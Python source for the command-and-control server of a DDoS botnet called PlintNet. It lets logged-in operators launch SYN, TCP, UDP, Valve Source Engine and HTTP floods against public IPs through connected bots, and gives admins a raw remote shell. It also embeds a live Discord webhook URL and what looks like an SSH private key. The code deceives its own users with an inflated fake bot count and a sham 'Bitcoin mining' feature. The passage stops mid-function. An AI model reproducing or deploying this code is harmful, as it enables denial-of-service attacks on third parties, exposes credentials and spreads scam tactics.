# Code by ASM_Royal / 0xYZ / 0xYZ-B / 0xYZ-C
# This Botnet code is licensed under the MIT License
# See https://github.com/ASMRoyal/plintnet for more
# This code is a part of PLINT and is not Public
# Written in Python Version 3
import socket
import threading
import sys
import time
import ipaddress
import requests
from colorama import Fore, init
import random
from discord_webhook import DiscordWebhook, DiscordEmbed
from datetime import datetime
import subprocess
import traceback
import os


key = """b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEArtbFLUvLmfcdl3UBLCuT2GR6SSbQciAi1i0rtkLFQve2xcHCQfCfXG/op/SBhwS7stzHtd/AKcQ/W1dctHLrztGcpwsLQu9woJNBBPpwZvSEsi3DTHgpYaz4qTDdlAE+p8apj5nwrco+sHU7i+TanB6UGBu3BiGkBRjyXO1xsvp9aZC07mJUfNjcqRjtQiB6HnaS6VskQ5wpukcTNhj5/OA4k4P+M4mCW/QnqOgSuJh7L7xiKRajtuYLsCW1juD/xfK4uAoShTQ7J8OsdLtmR4wQJMPerjXGSlv5O05zmflZjg841XJ+QIBhR24gL/ZEmBu/sfR0h2dv7wJcqHgldQAAA9CAMPHCgDDxwgAAAAdzc2gtcnNhAAABAQCu1sUtS8uZ9x2XdQEsK5PYZHpJJtByICLWLSu2QsVC97bFwcJB8J9cb+in9IGHBLuy3Me138ApxD9bV1y0cuvO0ZynCwtC73Cgk0EE+nBm9ISyLcNMeClhrPipMN2UAT6nxqmPmfCtyj6wdTuL5NqcHpQYG7cGIaQFGPJc7XGy+n1pkLTuYlR82NypGO1CIHoedpLpWyRDnCm6RxM2GPn84DiTg/4ziYJb9Ceo6BK4mHsvvGIpFqO25guwJbWO4P/F8ri4ChKFNDsnw6x0u2ZHjBAkw96uNcZKW/k7TnOZ+VmODzjVcn5AgGFHbiAv9kSYG7+x9HSHZ2/vAlyoeCV1AAAAAwEAAQAAAQATKlfS70wSRJRp1dmbDevW/Kyq+CZBXGR1Nd5kzEzzWlQeuW6h686MQ3gtcRABzPMGWE1MEoruCSUozhrLbQ2MTk3twbgqTjT6ZSnrcciAgK1LGtkduM5QdrWLVl/zqW9E1PIhW66WXmUg0rkETMHp+zAgtGkLswRXyrRGm4CrLbsQBfBGphAAzBReEEe0JxdHR1xmuhY+/v3CxCVHY5Ifqt2Eh92LTDgteFke7jLFafL5zWwQxX9vyziTeH9+n97r3+h06o7S/bDDwNo+a6NVHD0ToI8gvKK0jXiqbRBUQkyQz0+YfVl3ZKbxFQjbD5ccLLFyl634RAoutP0mcwABAAAAgQDbwP//jc+vpR3paAfPZ28Y2G2IUfrI6mMz4nuI48rtl32DgH8EWch2Adq6ph1zrnnFV3m2hZ9ytNKRPfjHgQ3nH4VjSUVbVKdTB9HXXu1hJVoU1hbjZZ8DlJD2buHLMcNe3+tCd94vtezXhtGZmi/nKZOX+XtgzHBOFj2uOeM8cwAAAIEA/ST+8GFWNm+6omgY+eLmNmO+99eQfCppGDMs+jg6qoEmbrco0dzywH+8iA0jf1Ii+iCMv8Daa8ztmKMuFsraGhC59pvg50B3sBBpL7mjw23k//8Uygy2FGbpGrKQjLPJwtBTOM781QD3nsPp6/V9BPzvcLQ6yyc40/Yj0Sf4EAEAAACBALDPptpWqBpix/MxcKLScSmPbxCW+hZikB6UJcjCQb+wSZFv1a7KjYLMO/MpedMhBFB2Xr+Mq2QykhffUQdrrOZt/nKvuUkBAxvb/+dgOlpp6tVtCaMfp3uuavx4ksHKuYmES6o5T/YM233kBCKM2GMbUpf/HEdPk3CK29d+yNV1AAAAEHJzYS1rZXktMjAyMzExMDEBAgMEBQYHCAkK"""
all_clients = {}
fake_bot_count = 129
bot_count = []
clients = []
bots = {}
ansi_clear = '\033[2J\033[H'
GREEN = '\033[38;5;47m'
start_time = str(datetime.now())
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1117894484005494845/gizDRYqj8jMfdE5JPite7xwoPJoHZp6VJ8jrOWUrddMoL4eDAZfMLGuYMTHSka1e_418')
embed = DiscordEmbed(title='Server', description="Server started\nTime:\n" + start_time, color='03b2f8')
webhook.add_embed(embed)
response = webhook.execute()

btc = ["bc1qw2pzhyt5t9z9hzcvwaw5s9d3uharpt4a0hgqu3", "bc1qukwqxlpazk7yrxqt379u3ere7kywrxe7fyvjpu", "bc1qn9jpmtnc5ucedsxdte0wmj5fvp8ksrmw6vpyq4", "bc1qjrnryf9ufakfykyg42kgsskx38326plcwn2nw6", "bc1qvyly8w2xrpmfazuvv3crj8hr92lrrg92pnr9ps",
"bc1qyvlkfp8ehupqusxc7g7hskelhayf6ervdzvcg6", "bc1qyvlkfp8ehupqusxc7g7hskelhayf6ervdzvcg6", "bc1qn4w2ljcdqgvyquxzzv6vt236653xgu2wk3ayk5", "bc1qxrlawdhs04hzyxk6h065hwx9ecawnls43tsvwr", "bc1q5g6y0qayq404k73swk5pwpxdd0ajszpm8m3seg"]

banner = f'''
                    {Fore.LIGHTCYAN_EX}  __________.__  .__        __  {Fore.LIGHTMAGENTA_EX} 
                    {Fore.LIGHTCYAN_EX}  \______   \  | |__| _____/{Fore.LIGHTMAGENTA_EX}  |_ 
                    {Fore.LIGHTCYAN_EX}   |     ___/  | |  |/  {Fore.LIGHTMAGENTA_EX}  \   __/
                    {Fore.LIGHTCYAN_EX}   |    |   |  |_|  {Fore.LIGHTMAGENTA_EX}|   |  \  |  
                    {Fore.LIGHTCYAN_EX}   |____|   |__{Fore.LIGHTMAGENTA_EX}__/__|___|  /__|  
                    {Fore.LIGHTCYAN_EX}***********{Fore.LIGHTMAGENTA_EX}**************\/******
                    {Fore.LIGHTCYAN_EX}*      {Fore.LIGHTMAGENTA_EX}BotNet by ASM_Royal      *
                    {Fore.LIGHTCYAN_EX}*{Fore.LIGHTMAGENTA_EX}        .gg/QCY6CuajqK         *
                    {Fore.LIGHTMAGENTA_EX}*********************************
        '''

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password, client_ip):
    """ read credentials from logins.txt file """
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            print(f'{client_ip} - Logged in as: {username}')
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def send_all(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    dead_clients = []
    for client2 in all_clients.keys():
        try:
            send(client2, f'{data.replace("_", " ")}')
        except:
            dead_clients.append(client2)

def send_banned(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send((Fore.RED + "You are Banned.").encode())
    socket.close()

def broadcast(data):
    """ send command to all bots """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)



def update_title(client, username, admin_list, test_users):
    """ updates the shell title, duh? """
    onti = 0
    if username in admin_list:
        status = 'Owner'
    elif username in test_users:
        status = 'Visitor'
    else:
        status = 'Member'
    while 1:
        try:
            onti += 2
            send(client, f'\33]0;Plint | Bots: {len(bots) + fake_bot_count} | Connected as: {username} | {status} | Time: {onti}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client, username, admin_list, test_users, clients, client_ip):
    for x in banner.split('\n'):
        send(client, x)

    file = open('blacklist.txt', 'r')
    file1 = file.readlines()

    if client_ip in file1:
        prompt = f'{Fore.LIGHTCYAN_EX}ERROR?[Banned]{Fore.LIGHTMAGENTA_EX}@{Fore.LIGHTCYAN_EX}Plint {Fore.LIGHTMAGENTA_EX}$ '
    elif username in file1:
        prompt = f'{Fore.LIGHTCYAN_EX}ERROR?[Banned]{Fore.LIGHTMAGENTA_EX}@{Fore.LIGHTCYAN_EX}Plint {Fore.LIGHTMAGENTA_EX}$ '
    else:
        prompt = f'{Fore.LIGHTCYAN_EX}{username}{Fore.LIGHTMAGENTA_EX}@{Fore.LIGHTCYAN_EX}Plint {Fore.LIGHTMAGENTA_EX}$ '

    send(client, prompt, False)

    
        

    while 1:
        
        if client_ip in file1:
            send_banned(client, " ")
            print(Fore.RED + username + ":" + client_ip + " was disconnected by the Server-Security")
            with open('logs/logs.log', 'a') as f:
                date = str(datetime.now().date())
                time = str(datetime.now().time())
                f.write("\n" + "[" + date + " - " + time + "] SERVER-SECURITY: " + username + ' was disconnected by the Server-Security')
            break
        
        if username in file1:
            send_banned(client, " ")
            print(Fore.RED + username + ":" + client_ip + " was disconnected by the Server-Security")
            with open('logs/logs.log', 'a') as f:
                date = str(datetime.now().date())
                time = str(datetime.now().time())
                f.write("\n" + "[" + date + " - " + time + "] SERVER-SECURITY: " + username + ' was disconnected by the Server-Security')
            break
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            
            
            
            if command == 'HELP':
                send(client, Fore.LIGHTMAGENTA_EX + '╔══════════╦══════════════════════════════════╗')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' HELP     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Shows list of commands           ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' METHODS  ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Shows list of attack methods     ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' TOOLS    ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Shows list of tools              ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' MINE     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Shows list of mining options     ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' CLEAR    ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Clears the screen                ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' LOGOUT   ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Disconnects from Botnet          ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' ACCOUNT  ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Shows your personal Stats        ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' ADMIN    ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Shows list of Admin Commands     ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '╚══════════╩══════════════════════════════════╝')
                send(client, '')

            elif command == "ADMIN":
                send(client, Fore.LIGHTMAGENTA_EX + '╔════════════════╦══════════════════════════════════╦═══════╗')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .shutdown      ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Shut the Botnet down             ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .botremove     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' remove all bots                  ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .shell         ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' access the root shell            ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .clients       ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' see connected clients            ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .broadcast     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' send a message to everyone       ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '╚════════════════╩══════════════════════════════════╩═══════╝')
                send(client, '')

            elif command == 'METHODS':
                send(client, Fore.LIGHTMAGENTA_EX + '╔══════════╦════════════════════════════════════════╦═══════╗')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .syn     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' TCP SYN flood                          ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .tcp     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' TCP junk flood                         ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .udp     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' UDP junk flood                         ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .vse     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' UDP Valve Source Engine specific flood ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .http    ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' HTTP GET request flood                 ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '╚══════════╩════════════════════════════════════════╩═══════╝')
                send(client, '')

            elif command == 'TOOLS':
                send(client, Fore.LIGHTMAGENTA_EX + '╔══════════╦═══════════════╦═══════╗')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .lookup  ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Lookup an IP  ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .msg     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Message Me    ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .info    ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Server Info   ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .ping    ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Ping a Host   ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '╚══════════╩═══════════════╩═══════╝')
                send(client, '')

            elif command == ".BROADCAST":
                if username in admin_list:
                    if len(args) == 2:
                        message = args[1]
                        message.replace('_', ' ')
                        send_all(client, Fore.LIGHTMAGENTA_EX + "\nMESSAGE BY ADMIN: \n" + Fore.LIGHTCYAN_EX + message + "\n")
                    else:
                        send(client, 'Usage: .broadcast ' + Fore.LIGHTCYAN_EX + '[YOUR_MESSAGE]' + Fore.RESET)
                else:
                    embed = DiscordEmbed(title='SECURITY WARNING', description="UNAUTHORIZED ACTIVITY DETECTED", color='ff0000')
                    embed.set_footer(text='check console for more informations!',icon_url="https://bestanimations.com/Signs&Shapes/Hazards/Caution/red-white-caution-sign-blinking-animated-gif.gif")
                    webhook.add_embed(embed)
                    response = webhook.execute(remove_embeds=True)
                    print(Fore.RED + "WARNING: AN UNAUTHORIZED USER TRIED TO BROADCAST A MESSAGE!\n  USER: " + username + "\n  COMMAND: " + args[0] + Fore.RESET)
                    send(client, Fore.RED + "You are not authorized to use this command!")
                    with open('logs/logs.log', 'a') as f:
                        date = str(datetime.now().date())
                        time = str(datetime.now().time())
                        f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' UNAUTHORIZED USER TRIED TO BROADCAST A MESSAGE')


            

            elif command == '.INFO':
                with open('settings.json', 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        send(client, "\n" + Fore.LIGHTCYAN_EX + line.strip())
                    send(client, '\n')

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                print(f'{username} logged out!')
                send(client, 'Killed Connection! Thanks for using PlintNet')
                clients.remove(client_ip)
                time.sleep(1)
                break
            

            elif command == 'ACCOUNT':
                if username in admin_list:
                    rank = "Admin  "
                elif username in test_users:
                    rank = "Visitor"
                else:
                    rank = "Member "
                print(f'{username} grabbed his Account Info!')
                send(client, Fore.LIGHTMAGENTA_EX + f'╔{Fore.LIGHTCYAN_EX}ASM_Royal{Fore.LIGHTMAGENTA_EX}═╦══════════════════╗')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' STATUS   ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Online           ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' RANK     ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' ' + rank + '          ' + Fore.LIGHTMAGENTA_EX + '║')
                send(client, Fore.LIGHTMAGENTA_EX + '╚══════════╩══════════════════╝')
                send(client, '')
 
            elif command == 'MINE':
                send(client, Fore.LIGHTMAGENTA_EX + '╔══════════╦════════════════════════════════════════╦═════════════╗')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .btcm    ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Mines Bitcoins for your Wallet         ' + Fore.LIGHTMAGENTA_EX + '║' + GREEN + ' ready' + Fore.LIGHTMAGENTA_EX + '       ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .ethm    ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Mines Ethereum for your Wallet         ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.YELLOW + ' maintenance' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' .dogem   ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.LIGHTCYAN_EX + ' Mines Dogecoins for your Wallet        ' + Fore.LIGHTMAGENTA_EX + '║' + Fore.YELLOW + ' maintenance' + Fore.LIGHTMAGENTA_EX + ' ║')
                send(client, Fore.LIGHTMAGENTA_EX + '╚══════════╩════════════════════════════════════════╩═════════════╝')
                send(client, '')

            elif command == ".SHUTDOWN":
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if username in admin_list:
                        os.system("TASKKILL /F /IM server.exe")
                    else:
                        embed = DiscordEmbed(title='SECURITY WARNING', description="UNAUTHORIZED ACTIVITY DETECTED", color='ff0000')
                        embed.set_footer(text='check console for more informations!',icon_url="https://bestanimations.com/Signs&Shapes/Hazards/Caution/red-white-caution-sign-blinking-animated-gif.gif")
                        webhook.add_embed(embed)
                        response = webhook.execute(remove_embeds=True)
                        print(Fore.RED + "WARNING: AN UNAUTHORIZED USER TRIED TO SHUT THE BOTNET DOWN!\n  USER: " + username + "\n  COMMAND: " + args[0] + Fore.RESET)
                        send(client, Fore.RED + "You are not authorized to use Shell commands!")
                        with open('logs/logs.log', 'a') as f:
                            date = str(datetime.now().date())
                            time = str(datetime.now().time())
                            f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' UNAUTHORIZED USER TRIED TO SHUT THE BOTNET DOWN')

            elif command == ".CLIENTS":
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if username in admin_list:
                        try:
                            message = f'\n{GREEN}Connected Clients:\n\r'
                            message2 = f'\n{GREEN}Connected Bots:\n\r'
                            message3 = ''
                            for cliente in clients:
                                message += Fore.RESET + "[" + Fore.LIGHTCYAN_EX + '{}'.format(cliente) + Fore.RESET + '] - Online\r\n'  # Use client's IP address
                            for boteste in bot_count:
                                message2 += Fore.RESET + "[" + Fore.LIGHTCYAN_EX + '{}'.format(boteste) + Fore.RESET + '] - Online\r\n'
                            with open("bots.txt", "r") as file:
                                while boties := file.readline():
                                    message3 += Fore.RESET + "[" + Fore.LIGHTCYAN_EX + '{}'.format(boties.rstrip()) + Fore.RESET + '] - Online\r\n'
                            send(client, message + message2 + message3)
                        except Exception as e:
                            print(e)
                    else:
                        embed = DiscordEmbed(title='SECURITY WARNING', description="UNAUTHORIZED ACTIVITY DETECTED", color='ff0000')
                        embed.set_footer(text='check console for more informations!',icon_url="https://bestanimations.com/Signs&Shapes/Hazards/Caution/red-white-caution-sign-blinking-animated-gif.gif")
                        webhook.add_embed(embed)
                        response = webhook.execute()
                        print(Fore.RED + "WARNING: AN UNAUTHORIZED USER TRIED TO CHECK THE CLIENTS!\n  USER: " + username + "\n  COMMAND: " + args[0])
                        send(client, Fore.RED + "You are not authorized to use Shell commands!")
                        with open('logs/logs.log', 'a') as f:
                            date = str(datetime.now().date())
                            time = str(datetime.now().time())
                            f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' UNAUTHORIZED USER TRIED TO CHECK CLIENTS')
                    


            elif command == ".SHELL":
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 2:
                        if username in admin_list:
                            try:
                                shorted_arg = args[1].replace("_", " ")
                                process = subprocess.Popen(f"{shorted_arg}", stdout=subprocess.PIPE, shell=True)
                                output, error = process.communicate()

                                if process.returncode != 0:
                                    print(f"Command failed with error {process.returncode}, stderr: {error}")
                                else:
                                    send(client, GREEN + "PS > " + output.decode('utf-8', 'ignore'))
                            except Exception as e:
                                print("An error occurred: ", str(e))
                                traceback.print_exc()
                        else:
                            embed = DiscordEmbed(title='SECURITY WARNING', description="UNAUTHORIZED ACTIVITY DETECTED", color='ff0000')
                            embed.set_footer(text='check console for more informations!',icon_url="https://bestanimations.com/Signs&Shapes/Hazards/Caution/red-white-caution-sign-blinking-animated-gif.gif")
                            webhook.add_embed(embed)
                            response = webhook.execute()
                            print(Fore.RED + "WARNING: AN UNAUTHORIZED USER TRIED TO USE SHELL COMMANDS!\n  USER: " + username + "\n  COMMAND: " + args[0] + args[1]  + Fore.RESET)
                            send(client, Fore.RED + "You are not authorized to use Shell commands!")
                            with open('logs/logs.log', 'a') as f:
                                date = str(datetime.now().date())
                                time = str(datetime.now().time())
                                f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' UNAUTHORIZED USER TRIED TO USE SHELL COMMANDS')
                    else:
                        send(client, 'Usage: .shell ' + Fore.LIGHTCYAN_EX + '[YOUR_SHELL_COMMAND]' + Fore.RESET)
                        send(client, 'Use _ instead of space!')

            elif command == '.ETHM':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    send(client, Fore.RED + 'Servers are offline!')

            elif command == '.DOGEM':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    send(client, Fore.RED + 'Servers are offline!')

            
            elif command == '.BOTREMOVE':
                if username not in admin_list:
                    send(client, Fore.RED + 'You are not allowed to remove bots of the botnet!')
                    embed = DiscordEmbed(title='SECURITY WARNING', description="UNAUTHORIZED ACTIVITY DETECTED", color='ff0000')
                    embed.set_footer(text='check console for more informations!',icon_url="https://bestanimations.com/Signs&Shapes/Hazards/Caution/red-white-caution-sign-blinking-animated-gif.gif")
                    webhook.add_embed(embed)
                    response = webhook.execute(remove_embeds=True)
                    print(Fore.RED + "WARNING: AN UNAUTHORIZED USER TRIED TO USE ADMIN COMMANDS!\n  USER: " + username + "\n  COMMAND: " + args[0] + Fore.RESET)
                    send(client, Fore.RED + "You are not authorized to use Shell commands!")
                    with open('logs/logs.log', 'a') as f:
                        date = str(datetime.now().date())
                        time = str(datetime.now().time())
                        f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' UNAUTHORIZED USER TRIED TO REMOVE BOTS')
                else:
                    break

            elif command == '.BTCM':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 2:
                        addr = args[1]
                        if addr.startswith('bc1'):
                            send(client, GREEN + 'Mining Started...')
                            valid = 1
                            invalid = 1
                            cash = 0
                            amo = 0
                            while True:
                                amo += 1
                                if amo == 11:
                                    break
                                ok = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
                                vb = random.choice(ok)
                                if vb == 1:
                                    valid += 1
                                    plus_cash = random.random()
                                    cash += plus_cash
                                    send(client, f"[{amo}/10] {Fore.LIGHTYELLOW_EX}VALID   {Fore.LIGHTBLUE_EX}[ {GREEN}{random.choice(btc)}{Fore.LIGHTBLUE_EX} ]{Fore.LIGHTMAGENTA_EX} Adding {GREEN}{plus_cash}$ {Fore.LIGHTMAGENTA_EX}To your account!")
                                else:
                                    invalid += 1
                                    send(client, f"[{amo}/10] {Fore.LIGHTRED_EX}INVALID {Fore.LIGHTBLUE_EX}[ {Fore.LIGHTRED_EX}{random.choice(btc)}{Fore.LIGHTBLUE_EX} ]{Fore.LIGHTMAGENTA_EX} No Cash were added to your account!")
                            send(client, 'Mining finished!')
                        else:
                            send(client, Fore.RED + 'Mining failed! This is not a valid bitcoin address')
                    else:
                        send(client, 'Usage: .btcm ' + Fore.LIGHTCYAN_EX + '[YOUR_BITCOIN_ADDRESS]')
            
            elif command == '.MSG':
                if len(args) == 2:
                    message = args[1]
                    message.replace("_", " ")
                    send(client, GREEN + f'Message sent!')
                    print('Message received from ' + username + ' : ', message)
                else:
                    send(client, 'Usage: .msg ' + Fore.LIGHTCYAN_EX + '[YOUR_MESSAGE_HERE]')

            elif command == '.VSE':
                if username in test_users:
                    send(client, Fore.RED + "You can't use commands as a visitor!")
                else:
                    if len(args) == 4:
                        ip = args[1]
                        port = args[2]
                        secs = args[3]
                        if validate_ip(ip):
                            if validate_port(port):
                                if validate_time(secs):
                                    with open('logs/logs.log', 'a') as f:
                                        date = str(datetime.now().date())
                                        time = str(datetime.now().time())
                                        f.write("\n" + "[" + date + " - " + time + "] User: " + username + ' VSE | Attack on: ' + ip + ' Port: ' + port + ' seconds: ' + secs)
                                    print('User: ' + username + ' VSE | Attack on: ', ip, 'port: ', port, 'seconds: ', secs)
                                    embed = DiscordEmbed(title='Attack by ' + username, description="VSE\nTarget: " + ip + "\nPort: " + port + "\nTime: " + secs + f"\nBots: {len(bots) + fake_bot_count}", color='03b2f8')
                                    webhook.add_embed(embed)
                                    response = webhook.execute(remove_embeds=True)

                                    send(client, GREEN + f'Attack sent to {len(bots) + fake_bot_count} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                            else:
